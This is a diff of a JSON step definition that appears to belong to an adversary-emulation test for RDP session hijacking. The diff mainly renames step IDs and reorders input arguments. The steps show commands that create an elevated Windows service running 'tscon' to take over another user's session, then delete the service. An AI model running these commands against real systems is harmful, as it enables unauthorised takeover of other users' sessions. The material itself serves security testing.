@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "bc7e0332-e953-4efc-babc-9a26b6e0258d",
+      "id": "192536d2-01f4-544a-9e69-10fe22f79c49",
       "type": "execute-command",
       "data": {
         "command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}\"\nnet start sesshijack",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "46387a39-954e-4363-a69f-2d89201e6c00",
+      "id": "2fe03fa1-81b8-50e2-8a36-6ffa083f9e78",
       "type": "execute-command",
       "data": {
         "command": "sc.exe delete sesshijack \u003enul 2\u003e\u00261",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "bc7e0332-e953-4efc-babc-9a26b6e0258d",
+      "s": "192536d2-01f4-544a-9e69-10fe22f79c49",
       "p": "on-success",
-      "o": "46387a39-954e-4363-a69f-2d89201e6c00"
+      "o": "2fe03fa1-81b8-50e2-8a36-6ffa083f9e78"
     },
     {
-      "s": "bc7e0332-e953-4efc-babc-9a26b6e0258d",
+      "s": "192536d2-01f4-544a-9e69-10fe22f79c49",
       "p": "on-failure",
-      "o": "46387a39-954e-4363-a69f-2d89201e6c00"
+      "o": "2fe03fa1-81b8-50e2-8a36-6ffa083f9e78"
     }
   ],
   "tags": [
@@ -43,16 +43,16 @@
   ],
   "input_arguments": [
     {
-      "name": "Destination_ID",
-      "type": "string",
-      "description": "Connect the session of another user to a different session",
-      "value": "rdp-tcp#55"
-    },
-    {
       "name": "Session_ID",
       "type": "string",
       "description": "The ID of the session to which you want to connect",
       "value": "1337"
+    },
+    {
+      "name": "Destination_ID",
+      "type": "string",
+      "description": "Connect the session of another user to a different session",
+      "value": "rdp-tcp#55"
     }
   ]
 }
